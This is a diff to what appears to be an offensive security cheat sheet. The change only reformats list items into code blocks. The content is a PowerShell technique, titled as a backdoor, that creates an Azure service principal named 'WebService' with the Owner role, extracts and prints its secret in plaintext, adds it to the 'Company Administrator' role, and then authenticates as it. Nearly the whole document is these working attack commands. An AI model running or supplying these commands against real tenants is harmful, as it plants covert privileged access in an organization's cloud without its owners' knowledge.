@@ -4,24 +4,24 @@
 
 ### Create a new Azure service principal as a backdoor
 
- - $spn = New-AzAdServicePrincipal -DisplayName "WebService" -Role Owner
+    $spn = New-AzAdServicePrincipal -DisplayName "WebService" -Role Owner
 
- - $spn
+    $spn
 
- - $BSTR = ::SecureStringToBSTR($spn.Secret)
+    $BSTR = ::SecureStringToBSTR($spn.Secret)
 
- - $UnsecureSecret = ::PtrToStringAuto($BSTR)
+    $UnsecureSecret = ::PtrToStringAuto($BSTR)
 
- - $UnsecureSecret
+    $UnsecureSecret
 
- - $sp = Get-MsolServicePrincipal -AppPrincipalId <AppID>
+    $sp = Get-MsolServicePrincipal -AppPrincipalId <AppID>
 
- - $role = Get-MsolRole -RoleName "Company Administrator"
+    $role = Get-MsolRole -RoleName "Company Administrator"
 
- - Add-MsolRoleMember -RoleObjectId $role.ObjectId -RoleMemberType ServicePrincipal -RoleMemberObjectId $sp.ObjectId
+    Add-MsolRoleMember -RoleObjectId $role.ObjectId -RoleMemberType ServicePrincipal -RoleMemberObjectId $sp.ObjectId
 
 ### Enter the AppID as username and what was returned for $UnsecureSecret as the password in the Get-Credential prompt
 
- - $cred = Get-Credential
+    $cred = Get-Credential
 
- - Connect-AzAccount -Credential $cred -Tenant “tenant ID" -ServicePrincipal
+    Connect-AzAccount -Credential $cred -Tenant “tenant ID" -ServicePrincipal
